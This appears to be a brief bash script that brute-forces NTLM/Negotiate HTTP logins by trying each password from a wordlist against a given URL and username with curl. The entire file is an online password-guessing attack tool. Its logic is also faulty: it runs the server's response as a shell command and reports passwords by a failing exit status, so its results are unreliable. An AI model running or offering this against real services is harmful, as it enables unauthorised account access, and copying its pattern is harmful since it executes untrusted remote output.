#!/bin/bash

if [ "$#" != "3" ]; then
 echo "Usage: ./ntlm.sh url username wordlist"
else
 cat $3 | while read line; do
  $(curl -s $1 --ntlm --negotiate -u $2:$line)
  if [[ 0 -ne $? ]]; then
    echo $line;
  fi;
 done
fi
